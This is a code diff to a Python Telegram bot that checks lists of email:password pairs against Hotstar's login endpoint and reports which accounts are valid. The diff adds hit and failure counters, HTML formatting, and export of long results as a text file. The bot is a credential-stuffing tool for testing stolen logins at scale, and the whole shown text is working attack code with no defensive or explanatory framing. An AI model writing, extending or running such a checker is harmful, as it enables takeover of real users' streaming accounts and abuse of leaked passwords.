@@ -1,8 +1,10 @@
 import requests
 import json
+import re
 import sys
 import os
 import asyncio
+from io import BytesIO
 
 from pyrogram import Client, filters, idle
 from pyrogram import __version__
@@ -52,7 +54,9 @@ async def checker(bot: HotstarChecker, message: Message):
             combo_list = list(
                 {combo.strip() for combo in message.text.split("\n") if combo.strip()}
             )
-            final = "**--Accounts checked result:**--\n"            
+            final = "<b><u>Hotstar Accounts Checked:</b></u>\n"           
+            hits = 0
+            bad = 0
             for account in combo_list:
                 try:
                     email, password = account.split(":")
@@ -70,13 +74,29 @@ async def checker(bot: HotstarChecker, message: Message):
                         }
                     r = requests.post(url, data=json.dumps(payload), headers=headers)
                     if r.status_code==200:
-                        final += f"\n- `{account}`: Valid ✅"                           
+                        final += f"\n- <code>{account}</code>: Valid ✅"             
+                        hits += 1
                     else:
-                        final += f"\n- `{account}`: Invalid ❌"   
+                        final += f"\n- <code>{account}</code>: Invalid ❌"
+                        bad += 1
                 except:
-                    final += f"\n- `{account}`: Invalid Format ❌"
+                    final += f"\n- <code>{account}</code>: Invalid Format ❌"
+                    bad += 1
                     
-            final  += f"\n\n**Checked by {message.from_user.mention}**\n__With ❤️ By @GodDrick__"        
+            final  += f"\n\n<b>Summary:</b>\n<b>Total Accs:</b> <code>{len(combo_list)}</code>\n<b>Hits:</b> <code>{hits}</code>\n<b>Bads:</b> <code>{bad}</code>\n\n<b>Checked by {message.from_user.mention}</b>\n<i>With ❤️ By @GodDrick</i>"        
+            if len(final) > 4000:
+                cleanr = re.compile("<.*?>")
+                cleantext = re.sub(cleanr, "", final)
+                with BytesIO(str.encode(cleantext)) as output:
+                    output.name = "hotstar_result.txt"
+                    await bot.send_document(
+                        chat_id=message.chat.id,
+                        document=output,
+                        filename="hotstar_result.txt",
+                        caption=f"<b>Summary:</b>\n<b>Total Accs:</b> <code>{len(combo_list)}</code>\n<b>Hits:</b> <code>{hits}</code>\n<b>Bads:</b> <code>{bad}</code>\n\n<b>Checked by {message.from_user.mention}</b>\n<i>With ❤️ By @GodDrick</i>",
+                    )
+                await omk.delete()    
+                return    
             await omk.edit(final)
             return
         
